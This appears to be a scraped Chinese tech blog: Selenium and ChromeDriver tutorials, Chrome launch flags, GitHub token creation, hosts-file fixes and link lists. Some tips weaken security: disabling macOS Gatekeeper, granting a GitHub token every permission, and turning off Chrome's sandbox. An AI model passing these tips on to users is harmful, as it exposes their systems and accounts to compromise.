目录（由于 Mac 该目录是隐藏的，所以可通过快捷键 command+shift+g 打开） 查看 ChromeDriver 版本：chromedriver –version。 注意，能够输出 ChromeDriver 版本即安装成功。 5. 编写脚本启动 Chrome 浏览器 123456# 启动Chromefrom selenium import webdriverdriver = webdriver.Chrome()driver.get(&#x27;http://www.baidu.com/&#x27;) # 打开百度 运行脚本，打开百度首页。 ————————————- 此处有坑 ————————————-&gt; 如果运行脚本，出现如下所示的 chromeDriver 不能运行的提示。 解决方案： 在电脑中找到终端。 2、在弹出的命令提示框中，输入 sudo spctl –master-disable，确定，提示你输入密码，密码就是你电脑的密码。 3、打开系统偏好设置，安全性与隐私里面，找到任何来源。","categories":[{"name":"软件测试","slug":"软件测试","permalink":"https://www.zhengjunyao.top/categories/%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"selenium","slug":"selenium","permalink":"https://www.zhengjunyao.top/tags/selenium/"}]},{"title":"Why’s THE Design一系列关于计算机领域中程序设计决策文章","slug":"Why’s THE Design 一系列关于计算机领域中程序设计决策的文章","date":"2022-06-08T06:41:48.956Z","updated":"2022-06-21T02:50:26.608Z","comments":true,"path":"2022/06/08/Why’s THE Design 一系列关于计算机领域中程序设计决策的文章/","link":"","permalink":"https://www.zhengjunyao.top/2022/06/08/Why%E2%80%99s%20THE%20Design%20%E4%B8%80%E7%B3%BB%E5%88%97%E5%85%B3%E4%BA%8E%E8%AE%A1%E7%AE%97%E6%9C%BA%E9%A2%86%E5%9F%9F%E4%B8%AD%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E5%86%B3%E7%AD%96%E7%9A%84%E6%96%87%E7%AB%A0/","excerpt":"","text":"Why’s THE Design 是一系列关于计算机领域中程序设计决策的文章，作者在这个系列的每一篇文章中都会提出一个具体的问题并从不同的角度讨论这种设计的优缺点、对具体实现造成的影响，文章写的非常详细，下面是目录，喜欢的可以前往学习。 Why’s THE Design 是一系列关于计算机领域中程序设计决策的文章，作者在这个系列的每一篇文章中都会提出一个具体的问题并从不同的角度讨论这种设计的优缺点、对具体实现造成的影响，文章写的非常详细，下面是目录，喜欢的可以前往学习。 Why’s THE Design：https://draven.co/whys-the-design/ 按分类组织网络 001 为什么 TCP 建立连接需要三次握手 005 为什么 DNS 使用 UDP 协议 012 为什么 TCP 协议有性能问题 013 为什么 UDP 头只有 8 个字节 017 为什么 TCP/IP 协议会拆分数据 018 为什么流媒体直播的延迟很高 019 为什么 HTTPS 需要 7 次握手以及 9 倍时延 020 为什么 TCP 协议有粘包问题 021 为什么 TCP 协议有 TIME_WAIT 状态 026 为什么 MAC 地址不需要全球唯一 027 为什么 IPv6 难以取代 IPv4 028 为什么集群需要 Overlay 网络 数据库 003 为什么 Redis 选择单线程模型 009 为什么 MySQL 使用 B+ 树 010 为什么 Redis 快照使用子进程 011 为什么 MongoDB 使用 B 树 015 为什么数据库会丢失数据 016 为什么比特币可以防篡改 024 为什么 MySQL 的自增主键不单调也不连续 031 为什么数据库不应该使用外键 036 为什么 OLAP 需要列式存储 操作系统 023 为什么 Linux 需要虚拟内存 029 为什么系统调用会消耗较多资源 030 为什么 Linux 默认页大小是 4KB 032 为什么 CPU 访问硬盘很慢 033 为什么 NUMA 会影响程序的延迟 034 为什么 HugePages 可以提升数据库性能 035 为什么 Linux 需要 Swapping 038 为什么早期的 Windows 需要整理碎片 039 为什么 Linux 和 macOS 不需要碎片整理 编程语言 014 为什么 Go 语言没有泛型 软件工程 002 为什么使用通信来共享内存 004 为什么你应该使用 Git 进行版本控制 006 为什么使用 MD5 存储密码非常危险 007 为什么基础服务不应该高可用 008 为什么总是需要无意义的 ID 018 为什么流媒体直播的延迟很高 022 为什么 0.1 + 0.2 = 0.300000004 025 为什么 0.1 + 0.2 = 0.3 037 为什么 Kubernetes 要替换 Docker 本站所有资源文章出自互联网收集整理，本站不参与制作，如果侵犯了您的合法权益，请联系本站我们会及时删除。 本站资源仅供研究、学习交流之用，若使用商业用途，请购买正版授权，否则产生的一切后果将由下载用户自行承担。","categories":[{"name":"资源","slug":"资源","permalink":"https://www.zhengjunyao.top/categories/%E8%B5%84%E6%BA%90/"}],"tags":[{"name":"学习资源","slug":"学习资源","permalink":"https://www.zhengjunyao.top/tags/%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%BA%90/"}]},{"title":"github获取token","slug":"github 获取 token","date":"2022-06-07T02:36:03.578Z","updated":"2022-06-07T02:42:11.379Z","comments":true,"path":"2022/06/07/github 获取 token/","link":"","permalink":"https://www.zhengjunyao.top/2022/06/07/github%20%E8%8E%B7%E5%8F%96%20token/","excerpt":"","text":"github图床需要GitHub 的token，下面将获取 token 的过程记录一下： 1、在 https://github.com 登录你的帐号，登录以后点击右上角你的头像的 Settings 2、 点击 Developer settings 下的 Personal access tokens 如果您老人家觉得上面两个步骤很麻烦，那么您就直接进入这个链接 (前提是你要先登陆你的帐号)：https://github.com/settings/tokens 3、点击 https://github.com/settings/tokens/new 这个超链接，就是创建你的 token。 4、在 Token description 中随便填一个描述名称，下面的复选框是你这个 token 需要的权限，全部勾上就可以了。 然后点击下面这个绿色的按钮： 5、下面这个就是你的 token 了，可以直接复制使用。","categories":[{"name":"工具使用","slug":"工具使用","permalink":"https://www.zhengjunyao.top/categories/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"}],"tags":[{"name":"github","slug":"github","permalink":"https://www.zhengjunyao.top/tags/github/"}]},{"title":"selenium Python教程","slug":"Selenium Python 教程","date":"2022-06-06T08:18:49.330Z","updated":"2022-06-06T09:35:34.098Z","comments":true,"path":"2022/06/06/Selenium Python 教程/","link":"","permalink":"https://www.zhengjunyao.top/2022/06/06/Selenium%20Python%20%E6%95%99%E7%A8%8B/","excerpt":"","text":"Selenium 是一个用电脑模拟人操作浏览器网页，可以实现自动化，测试等！废话不多说，直接干！ 准备工作 安装seleniumm pip install selenium 下载浏览器驱动 Firefox 浏览器驱动：geckodriver Chrome 浏览器驱动：chromedriver ,CNPM Binaries Mirror (npmmirror.com)， taobao 备用地址 IE 浏览器驱动：IEDriverServer Edge 浏览器驱动：MicrosoftWebDriver Opera 浏览器驱动：operadriver PhantomJS 浏览器驱动：phantomjs 需要把浏览器驱动放入系统路径中，或者直接告知 selenuim 的驱动路径 另外启动浏览器，可以设置一些参数，比如无界面之类的，详细参考： 补充上面一个参数，添加代理：options.add_argument(“–proxy-server=http://XXXXX.com:80“) 可以测试是否正常使用，以下代码： 12345678910111213141516171819from selenium import webdriverdriver = webdriver.Firefox() # Firefox浏览器# driver = webdriver.Firefox(&quot;驱动路径&quot;)driver = webdriver.Chrome() # Chrome浏览器driver = webdriver.Ie() # Internet Explorer浏览器driver = webdriver.Edge() # Edge浏览器driver = webdriver.Opera() # Opera浏览器driver = webdriver.PhantomJS() # PhantomJS# 打开网页driver.get(url) # 打开url网页 比如 driver.get(&quot;http://www.baidu.com&quot;) 2021 年 6 月 27 日 补充 用selenium 登录新版的edge方法 首先，安装pip install msedge-selenium-tools 接下来，使用以下代码： 12345678910from selenium import webdriverfrom msedge.selenium_tools import Edge, EdgeOptionsoptions = EdgeOptions()options.use_chromium = Trueoptions.binary_location = r&quot;C:\\xx\\Microsoft\\EdgeCore\\93.0.926.0\\msedge.exe&quot; # 浏览器的位置driver = Edge(options=options, executable_path=r&quot;D:\\xx\\Desktop\\edgedriver_win64\\msedgedriver.exe&quot;) # 相应的浏览器的驱动位置​driver.get(&quot;http://www.baidu.com&quot;)​ 元素定位123456789find_element_by_id()find_element_by_name()find_element_by_class_name()find_element_by_tag_name()find_element_by_link_text()find_element_by_partial_link_text()find_element_by_xpath()find_element_by_css_selector() 在element变成elements就是找所有满足的条件，返回数组。 一般我都自己采用 xpath 获取元素的，复制即可 关于获取对象的 api 查找： 控制浏览器操作 控制浏览器窗口大小 driver.set_window_size(480, 800) 浏览器后退，前进 # 后退 driver.back() # 前进 driver.forward() 刷新 driver.refresh() # 刷新 Webelement 常用方法 点击和输入 driver.find_element_by_id(&quot;kw&quot;).clear() # 清楚文本 driver.find_element_by_id(&quot;kw&quot;).send_keys(&quot;selenium&quot;) # 模拟按键输入 driver.find_element_by_id(&quot;su&quot;).click() # 单机元素 提交 可以在搜索框模拟回车操作 search_text = driver.find_element_by_id(&#39;kw&#39;) search_text.send_keys(&#39;selenium&#39;) search_text.submit() 其他 size： 返回元素的尺寸。 text： 获取元素的文本。 get_attribute(name)： 获得属性值。 is_displayed()： 设置该元素是否用户可见。 鼠标操作在 WebDriver 中， 将这些关于鼠标操作的方法封装在 ActionChains 类提供。 ActionChains 类提供了鼠标操作的常用方法： perform()： 执行所有 ActionChains 中存储的行为； context_click()： 右击； double_click()： 双击； drag_and_drop()： 拖动； move_to_element()： 鼠标悬停。 举个例子： 123456789101112from selenium import webdriver# 引入 ActionChains 类from selenium.webdriver.common.action_chains import ActionChainsdriver = webdriver.Chrome()driver.get(&quot;https://www.baidu.cn&quot;)# 定位到要悬停的元素above = driver.find_element_by_link_text(&quot;设置&quot;)# 对定位到的元素执行鼠标悬停操作ActionChains(driver).move_to_element(above).perform() 键盘事件以下为常用的键盘操作： send_keys(Keys.BACK_SPACE) 删除键（BackSpace） send_keys(Keys.SPACE) 空格键 (Space) send_keys(Keys.TAB) 制表键 (Tab) send_keys(Keys.ESCAPE) 回退键（Esc） send_keys(Keys.ENTER) 回车键（Enter） send_keys(Keys.CONTROL,’a’) 全选（Ctrl+A） send_keys(Keys.CONTROL,’c’) 复制（Ctrl+C） send_keys(Keys.CONTROL,’x’) 剪切（Ctrl+X） send_keys(Keys.CONTROL,’v’) 粘贴（Ctrl+V） send_keys(Keys.F1) 键盘 F1 …… send_keys(Keys.F12) 键盘 F12 123456# 输入框输入内容driver.find_element_by_id(&quot;kw&quot;).send_keys(&quot;seleniumm&quot;)# 删除多输入的一个 mdriver.find_element_by_id(&quot;kw&quot;).send_keys(Keys.BACK_SPACE) 获取断言信息1234title = driver.title # 打印当前页面titlenow_url = driver.current_url # 打印当前页面URLuser = driver.find_element_by_class_name(&#x27;nums&#x27;).text # # 获取结果数目 等待页面加载完成 显示等待 显式等待使 WebdDriver 等待某个条件成立时继续执行，否则在达到最大时长时抛出超时异常（TimeoutException）。 1234567891011121314from selenium import webdriverfrom selenium.webdriver.common.by import Byfrom selenium.webdriver.support.ui import WebDriverWaitfrom selenium.webdriver.support import expected_conditions as ECdriver = webdriver.Firefox()driver.get(&quot;http://www.baidu.com&quot;)element = WebDriverWait(driver, 5, 0.5).until( EC.presence_of_element_located((By.ID, &quot;kw&quot;)) )element.send_keys(&#x27;selenium&#x27;)driver.quit() WebDriverWait 类是由 WebDirver 提供的等待方法。在设置时间内，默认每隔一段时间检测一次当前页面元素是否存在，如果超过设置时间检测不到则抛出异常。具体格式如下： WebDriverWait(driver, timeout, poll_frequency=0.5, ignored_exceptions=None) driver ：浏览器驱动。 timeout ：最长超时时间，默认以秒为单位。 poll_frequency ：检测的间隔（步长）时间，默认为 0.5S。 ignored_exceptions ：超时后的异常信息，默认情况下抛 NoSuchElementException 异常。 WebDriverWait() 一般由 until() 或 until_not() 方法配合使用，下面是 until() 和 until_not() 方法的说明。 until(method, message=‘’) 调用该方法提供的驱动程序作为一个参数，直到返回值为 True。 until_not(method, message=‘’) 调用该方法提供的驱动程序作为一个参数，直到返回值为 False。 在本例中，通过 as 关键字将 expected_conditions 重命名为 EC，并调用 presence_of_element_located() 方法判断元素是否存在。 隐式等待 如果某些元素不是立即可用的，隐式等待是告诉 WebDriver 去等待一定的时间后去查找元素。 默认等待时间是 0 秒，一旦设置该值，隐式等待是设置该 WebDriver 的实例的生命周期。 123456from selenium import webdriverdriver = webdriver.Firefox() driver.implicitly_wait(10) # seconds driver.get(&quot;http://somedomain/url_that_delays_loading&quot;) myDynamicElement = driver.find_element_by_id(&quot;myDynamicElement&quot;) 在不同的窗口和框架之间移动123driver.switch_to_window(&quot;windowName&quot;)driver.switch_to_frame(&quot;frameName&quot;) 以直接取表单的 id 或 name 属性。如果 iframe 没有可用的 id 和 name 属性，则可以通过下面的方式进行定位。 123456#先通过xpth定位到iframexf = driver.find_element_by_xpath(&#x27;//*[@id=&quot;x-URS-iframe&quot;]&#x27;)#再将定位对象传给switch_to_frame()方法driver.switch_to_frame(xf) 一旦我们完成了 frame 中的工作，我们可以这样返回父 frame: 12driver.switch_to_default_content() 警告框处理12alert = driver.switch_to_alert() text：返回 alert/confirm/prompt 中的文字信息。 accept()：接受现有警告框。 dismiss()：解散现有警告框。 send_keys(keysToSend)：发送文本至警告框。keysToSend：将文本发送至警告框。 下拉框选择12345678910from selenium import webdriverfrom selenium.webdriver.support.select import Selectfrom time import sleepdriver = webdriver.Chrome()driver.implicitly_wait(10)driver.get(&#x27;http://www.baidu.com&#x27;)sel = driver.find_element_by_xpath(&quot;//select[@id=&#x27;nr&#x27;]&quot;)Select(sel).select_by_value(&#x27;50&#x27;) # 显示50条 文件上传12driver.find_element_by_name(&quot;file&quot;).send_keys(&#x27;D:\\\\upload_file.txt&#x27;) # # 定位上传按钮，添加本地文件 cookie 操作WebDriver 操作 cookie 的方法： get_cookies()： 获得所有 cookie 信息。 get_cookie(name)： 返回字典的 key 为 “name” 的 cookie 信息。 add_cookie(cookie_dict) ： 添加 cookie。“cookie_dict” 指字典对象，必须有 name 和 value 值。 delete_cookie(name,optionsString)：删除 cookie 信息。“name” 是要删除的 cookie 的名称，“optionsString” 是该 cookie 的选项，目前支持的选项包括 “路径”，“域”。 delete_all_cookies()： 删除所有 cookie 信息 调用 JavaScript 代码123js=&quot;window.scrollTo(100,450);&quot;driver.execute_script(js) # 通过javascript设置浏览器窗口的滚动条位置 通过 execute_script() 方法执行 JavaScripts 代码来移动滚动条的位置。 窗口截图12driver.get_screenshot_as_file(&quot;D:\\\\baidu_img.jpg&quot;) # 截取当前窗口，并指定截图图片的保存位置 关闭浏览器 close() 关闭单个窗口 quit() 关闭所有窗口 直接用 cookie 登录方法链接：https://www.jianshu.com/p/773c58406bdb 手动获取网页的 cookie，将其序列化并存储在本地 写入代码 123for item in cookies: driver.add_cookie(item) 参考链接： http://www.testclass.net/selenium_python https://selenium-python-zh.readthedocs.io/en/latest/index.html","categories":[{"name":"软件测试","slug":"软件测试","permalink":"https://www.zhengjunyao.top/categories/%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"selenium","slug":"selenium","permalink":"https://www.zhengjunyao.top/tags/selenium/"}]},{"title":"selenium启动chrome配置参数问题","slug":"selenium 启动 Chrome 配置参数问题","date":"2022-06-06T08:09:00.726Z","updated":"2022-06-06T09:35:42.194Z","comments":true,"path":"2022/06/06/selenium 启动 Chrome 配置参数问题/","link":"","permalink":"https://www.zhengjunyao.top/2022/06/06/selenium%20%E5%90%AF%E5%8A%A8%20Chrome%20%E9%85%8D%E7%BD%AE%E5%8F%82%E6%95%B0%E9%97%AE%E9%A2%98/","excerpt":"","text":"每次当 selenium 启动 chrome 浏览器的时候，chrome 浏览器很干净，没有插件、没有收藏、没有历史记录，这是因为 selenium 在启动 chrome 时为了保证最快的运行效率，启动了一个裸浏览器，这就是为什么需要配置参数的原因，但是有些时候我们需要的不仅是一个裸浏览器。 selenium 启动配置参数接收是 ChromeOptions 类，创建方式如下： 12from selenium import webdriveroption = webdriver.ChromeOptions() 创建了 ChromeOptions 类之后就是添加参数，添加参数有几个特定的方法，分别对应添加不同类型的配置项目。 设置 chrome 二进制文件位置 (binary_location) 1234567891011121314151617from selenium import webdriveroption = webdriver.ChromeOptions()# 添加启动参数option.add_argument()# 添加扩展应用 option.add_extension()option.add_encoded_extension()# 添加实验性质的设置参数 option.add_experimental_option()# 设置调试器地址option.debugger_address() 常用配置参数： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748from selenium import webdriveroption = webdriver.ChromeOptions()# 添加UAoptions.add_argument(&#x27;user-agent=&quot;MQQBrowser/26 Mozilla/5.0 (Linux; U; Android 2.3.7; zh-cn; MB200 Build/GRJ22; CyanogenMod-7) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1&quot;&#x27;)# 指定浏览器分辨率options.add_argument(&#x27;window-size=1920x3000&#x27;) # 谷歌文档提到需要加上这个属性来规避bugchrome_options.add_argument(&#x27;--disable-gpu&#x27;) # 隐藏滚动条, 应对一些特殊页面options.add_argument(&#x27;--hide-scrollbars&#x27;)# 不加载图片, 提升速度options.add_argument(&#x27;blink-settings=imagesEnabled=false&#x27;) # 浏览器不提供可视化页面. linux下如果系统不支持可视化不加这条会启动失败options.add_argument(&#x27;--headless&#x27;) # 以最高权限运行options.add_argument(&#x27;--no-sandbox&#x27;)# 手动指定使用的浏览器位置options.binary_location = r&quot;C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe&quot; #添加crx插件option.add_extension(&#x27;d:\\crx\\AdBlock_v2.17.crx&#x27;) # 禁用JavaScriptoption.add_argument(&quot;--disable-javascript&quot;) # 设置开发者模式启动，该模式下webdriver属性为正常值options.add_experimental_option(&#x27;excludeSwitches&#x27;, [&#x27;enable-automation&#x27;]) # 禁用浏览器弹窗prefs = &#123; &#x27;profile.default_content_setting_values&#x27; : &#123; &#x27;notifications&#x27; : 2 &#125; &#125; options.add_experimental_option(&#x27;prefs&#x27;,prefs)driver=webdriver.Chrome(chrome_options=chrome_options) 浏览器地址栏参数： 在浏览器地址栏输入下列命令得到相应的信息 1234567891011121314151617about:version - 显示当前版本 about:memory - 显示本机浏览器内存使用状况 about:plugins - 显示已安装插件 about:histograms - 显示历史记录 about:dns - 显示DNS状态 about:cache - 显示缓存页面 about:gpu -是否有硬件加速 chrome://extensions/ - 查看已经安装的扩展 其他配置项目参数 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687–user-data-dir=”[PATH]” # 指定用户文件夹User Data路径，可以把书签这样的用户数据保存在系统分区以外的分区 –disk-cache-dir=”[PATH]“ # 指定缓存Cache路径 –disk-cache-size= # 指定Cache大小，单位Byte –first run # 重置到初始状态，第一次运行 –incognito # 隐身模式启动 –disable-javascript # 禁用Javascript --omnibox-popup-count=&quot;num&quot; # 将地址栏弹出的提示菜单数量改为num个 --user-agent=&quot;xxxxxxxx&quot; # 修改HTTP请求头部的Agent字符串，可以通过about:version页面查看修改效果 --disable-plugins # 禁止加载所有插件，可以增加速度。可以通过about:plugins页面查看效果 --disable-javascript # 禁用JavaScript，如果觉得速度慢在加上这个 --disable-java # 禁用java --start-maximized # 启动就最大化 --no-sandbox # 取消沙盒模式 --single-process # 单进程运行 --process-per-tab # 每个标签使用单独进程 --process-per-site # 每个站点使用单独进程 --in-process-plugins # 插件不启用单独进程 --disable-popup-blocking # 禁用弹出拦截 --disable-plugins # 禁用插件 --disable-images # 禁用图像 --incognito # 启动进入隐身模式 --enable-udd-profiles # 启用账户切换菜单 --proxy-pac-url # 使用pac代理 [via 1/2] --lang=zh-CN # 设置语言为简体中文 --disk-cache-dir # 自定义缓存目录 --disk-cache-size # 自定义缓存最大值（单位byte） --media-cache-size # 自定义多媒体缓存最大值（单位byte） --bookmark-menu # 在工具 栏增加一个书签按钮 --enable-sync # 启用书签同步","categories":[{"name":"软件测试","slug":"软件测试","permalink":"https://www.zhengjunyao.top/categories/%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"selenium","slug":"selenium","permalink":"https://www.zhengjunyao.top/tags/selenium/"}]},{"title":"使用notion高效管理自我","slug":"如何使用notion高效管理自我 ","date":"2022-01-24T23:35:18.000Z","updated":"2022-06-21T02:09:26.813Z","comments":true,"path":"2022/01/25/如何使用notion高效管理自我 /","link":"","permalink":"https://www.zhengjunyao.top/2022/01/25/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8notion%E9%AB%98%E6%95%88%E7%AE%A1%E7%90%86%E8%87%AA%E6%88%91%20/","excerpt":"","text":"如何使用notion高效管理自我为什么选择notion（why）onenote的缺点还没接触notion之前使用onenote作为主力笔记软件，然而onenote缺点太明显了： 界面UI实在太“微软”了，我个人很不喜欢； 作为一种富文本笔记软件，颇有让人感觉使用word写笔记一样，样式限制很死，同时对多设备下协同并不是那么完美； 支持的插件太少了，而且功能很难用，就是跳不出那种条条框框给人耳目一新的感觉； all in one notion接触notion后我完全爱上这个免费开源的软件了，我用这个工具根据我的需求构建了我日常使用场景： mac+ipad+phone phone+pocket+notion chrome+notion插件+notion notion是什么样的软件（what）在我看来，它可以作为你全部日常生活和工作的统一调度中心 notion优点： 他是一款使用markdown的软件，对于格式兼容友好很多，反正现在就是很讨厌word这些富文本； 里面有很多模版可以直接套用，也可以参考自己的使用自己随心所欲创建一个模版； 它也可以使用于项目管理，支持多人协同，在我看来跟飞书差不多而且优于飞书； 样式组件也很多，可以自行谷歌； 最关键是免费！ 我是怎么使用notion实现高效的自我管理mac+ipad+phone首先我主要使用mac上常开，使用mac占用我大多时间，iPad和phone上作为移动端上同步协同，主要强调是便携灵活，mac端和移动端都安装了notion，notion国内使用不用梯子，速度也很快 chrome+notion插件+notion首先我chrome上装了notion插件，notion也创建了可以同步浏览器的database，每次我看技术文档这些或者看到一半需要跳到其他活，或者我觉这个写得很好可以给我带来素材思路启发就收藏加上tips，我称其为idea，为了能将我每时每刻的idea都能随时记录下来，日后可以在这个database上考虑是否可以实现，从而进行排期实现，我的想法就能马上实现，随时行动实现，我称为敏捷性。 1，当我浏览到一个网页很喜欢，点击插件同步到我的notion database 2，我的notion database就会同步，我自己添加一些列 phone+pocket+notion移动端主要是我外出比如上班通勤，我获取信息渠道主要是阅读公众号技术文章，微信自带的浮窗和收藏很鸡肋，我是同步到pocket上，然后pocket同步到我的database上，这样我可以统一看到我的所有信息进行统一规划 当我在微信端阅读了一个技术文章 同步成功 我的notion思路 规划（action） 面板 知识库（repository） 数据库： 当然电影和阅读这些我觉得豆瓣上已经很好用，没必要重新手工同步建一个，就目前只有一个 notion给我带来了什么 更直观的日常自我管理 目标细分更能推动去实现的动力，拆解成每日，每周小目标依次解决 日常处理更有针对性，专注性，同时也更高效 碎片化的信息能更敏捷的体系化，并能随时留住很棒的idea去排期实现 生活工作学习更有主次优先级","categories":[{"name":"效率工具","slug":"效率工具","permalink":"https://www.zhengjunyao.top/categories/%E6%95%88%E7%8E%87%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"notion","slug":"notion","permalink":"https://www.zhengjunyao.top/tags/notion/"}]},{"title":"解决连接github中443问题","slug":"解决连接github中443问题 ","date":"2022-01-03T22:47:54.000Z","updated":"2022-06-07T02:42:23.891Z","comments":true,"path":"2022/01/04/解决连接github中443问题 /","link":"","permalink":"https://www.zhengjunyao.top/2022/01/04/%E8%A7%A3%E5%86%B3%E8%BF%9E%E6%8E%A5github%E4%B8%AD443%E9%97%AE%E9%A2%98%20/","excerpt":"","text":"问题：今天打开vscode试图克隆github上的项目但是报443连接失败，前提：我是全天24小时挂着代理，网上搜索的解决办法太垃圾了（关掉代理）自己尝试解决了 一，查看ip点开第一个连接查看github的IP地址：https://github.com.ipaddress.com/ 将网页中的 IP Address 复制下来 后面备用 点击第二个连接：https://github.com.ipaddress.com/assets-cdn.github.com 将网页中的 IP Address 复制下来 后面备用 点击第三个连接：https://github.com.ipaddress.com/assets-cdn.github.com 同理记住IP address 二，配置host使用命令： sudo nano /private/etc/hosts 输入上一步查看的ip地址 三，刷新DNSsudo killall -HUP mDNSResponder;say DNS cache has been flushed 再尝试ping github成功，完美解决","categories":[{"name":"工具使用","slug":"工具使用","permalink":"https://www.zhengjunyao.top/categories/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"}],"tags":[{"name":"github","slug":"github","permalink":"https://www.zhengjunyao.top/tags/github/"}]},{"title":"python速记版","slug":"python","date":"2021-12-29T14:38:25.458Z","updated":"2022-06-06T09:34:55.648Z","comments":true,"path":"2021/12/29/python/","link":"","permalink":"https://www.zhengjunyao.top/2021/12/29/python/","excerpt":"","text":"python 爬取过的20个基础爬虫案例自己爬取过的20个基础爬虫案例_不愿意透露姓名的网友-CSDN博客_爬虫实例 python多线程详解python多线程详解（超详细）_世俗的眼光-CSDN博客_python 多线程 Python+unittest+requests 接口自动化测试框架搭建Python+unittest+requests 接口自动化测试框架搭建 完整的框架搭建过程 实战_songlh1234的博客-CSDN博客_python接口自动化测试框架 Flask—框架快速入门Flask—框架快速入门_菜鸟可以飞的博客-CSDN博客_flask Anaconda详细安装及使用教程Anaconda详细安装及使用教程（带图文）_代码帮-CSDN博客 Python 程序打包成 .exe python pyqt5 制作一个随机点名python pyqt5 制作一个随机点名_Dath闲人的博客-CSDN博客 sklearn库的学习sklearn库的学习_yeal-CSDN博客_sklearn PyQt5（designer）入门教程PyQt5（designer）入门教程_AzureMouse的博客-CSDN博客_pyqt5 Django—-做一个简单网页的教程Django—-做一个简单网页的教程(适合初学者) Flask项目搭建及部署Flask项目搭建及部署（完整版！全网最全）_asd529735325的博客-CSDN博客_flask部署 Python Flask Web 框架入门Python Flask Web 框架入门_python学习者的博客-CSDN博客 【OCR 文字识别】Python中一个不错的OCR库-EasyOCR【OCR 文字识别】Python中一个不错的OCR库-EasyOCR_赖德发的博客-CSDN博客_easyocr Python GUI之tkinter窗口视窗教程大集合Python GUI之tkinter窗口视窗教程大集合（看这篇就够了）_ahilll的博客-CSDN博客_tkinter wxPython入门中文版 (Getting Started with wxPython)wxPython入门中文版 (Getting Started with wxPython)","categories":[{"name":"链接汇总","slug":"链接汇总","permalink":"https://www.zhengjunyao.top/categories/%E9%93%BE%E6%8E%A5%E6%B1%87%E6%80%BB/"}],"tags":[{"name":"python","slug":"python","permalink":"https://www.zhengjunyao.top/tags/python/"}]},{"title":"Linux速记版","slug":"linux","date":"2021-12-29T14:38:25.442Z","updated":"2022-06-06T09:34:46.280Z","comments":true,"path":"2021/12/29/linux/","link":"","permalink":"https://www.zhengjunyao.top/2021/12/29/linux/","excerpt":"","text":"LinuxLinux 打包压缩命令Linux 打包压缩命令_zoujin6649的博客-CSDN博客_linux打包压缩命令tar chmod命令原理及用法详解chmod命令原理及用法详解_lyy14011305的博客-CSDN博客_chmod命令用法 linux修改root密码和修改其他用户密码linux修改root密码和修改其他用户密码_英阿的博客-CSDN博客_root修改其他用户密码 linux 输入、输出重定向的概念和用法详解linux 输入、输出重定向的概念和用法详解（Day01）_world_zheng的博客-CSDN博客_linux输入重定向 linux cat /etc/passwd 说明linux cat /etc/passwd 说明_王肇朋的博客-CSDN博客 awk详解awk详解_u010502101的博客-CSDN博客_awk linux awk命令详解linux awk命令详解 - ggjucheng - 博客园 ps -ef|grep详解【Linux】ps -ef|grep详解_lukabruce的博客-CSDN博客 bat文件.bat 文件是什么?做什么用的? rz、sz命令Linux中rz、sz命令实现方便的上传下载文件_wang123459的博客-CSDN博客_rz命令下载 Linux中的netstat命令详解Linux中的netstat命令详解_leap的博客-CSDN博客 linux查看历史命令linux查看历史命令_人人为我，我为人人-CSDN博客_linux查看历史命令 linux压缩和解压缩相关命令『学了就忘』Linux基础命令 - 32、压缩和解压缩相关命令 linux网络命令https://www.cnblogs.com/chuijingjing/articles/8527996.html Linux基础必懂：eth0,eth1,eth2,loLinux基础必懂：eth0,eth1,eth2,lo是什么意思？_zeusgis的专栏-CSDN博客 https://blog.csdn.net/qiushisoftware/article/details/80877172?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522163661339016780264084803%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=163661339016780264084803&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2allfirst_rank_ecpm_v1~rank_v31_ecpm-4-80877172.pc_search_result_control_group&amp;utm_term=ip%E9%87%8C%E7%9A%84eth0%E6%98%AF%E4%BB%80%E4%B9%88&amp;spm=1018.2226.3001.4187 Linux命令之ps：查看进程状态 linux杀死进程的五种方法linux杀死进程的五种方法_MrCoder的博客-CSDN博客_linux杀死进程命令kill linux系统查看服务内存，cpu，硬盘命令linux系统查看服务内存，cpu，硬盘命令_张哈哈爱吃肉的博客-CSDN博客 which、whereis、locate、find的区别Linux下4个查找命令which、whereis、locate、find的区别_zhaizhai的博客-CSDN博客_whereis 查找 Linux下4个查找命令which、whereis、locate、find的总结_Sky的专栏-CSDN博客_whereis命令 Linux下find命令详解Linux下find命令详解_liangkk的博客-CSDN博客_find linux crontab的使用和说明crontab的使用和说明_步步心愿的博客-CSDN博客_crontab crond和crontab详解_月已满西楼的博客-CSDN博客_crond crontab的使用方法介绍_python小白的逆袭之路-CSDN博客_crontab","categories":[{"name":"链接汇总","slug":"链接汇总","permalink":"https://www.zhengjunyao.top/categories/%E9%93%BE%E6%8E%A5%E6%B1%87%E6%80%BB/"}],"tags":[{"name":"linux","slug":"linux","permalink":"https://www.zhengjunyao.top/tags/linux/"}]},{"title":"java速记版","slug":"java","date":"2021-12-29T14:38:25.409Z","updated":"2022-06-06T09:34:38.646Z","comments":true,"path":"2021/12/29/java/","link":"","permalink":"https://www.zhengjunyao.top/2021/12/29/java/","excerpt":"","text":"java缓存穿透、缓存击穿、缓存雪崩区别和解决方案缓存穿透、缓存击穿、缓存雪崩区别和解决方案_kongtiao5的专栏-CSDN博客 Redis浅谈Redis是什么？什么作用？优点和缺点_不由不该的博客-CSDN博客_redis是什么 MySQL事务隔离级别详解MySQL事务隔离级别详解 - JAVA夜无眠 - ITeye博客 数据库的脏数据问题_budapest的专栏-CSDN博客_数据库脏数据 数据库的脏数据问题数据库的脏数据问题_budapest的专栏-CSDN博客_数据库脏数据 面向接口编程面试官的窒息逼问: 到底什么是面向接口编程? 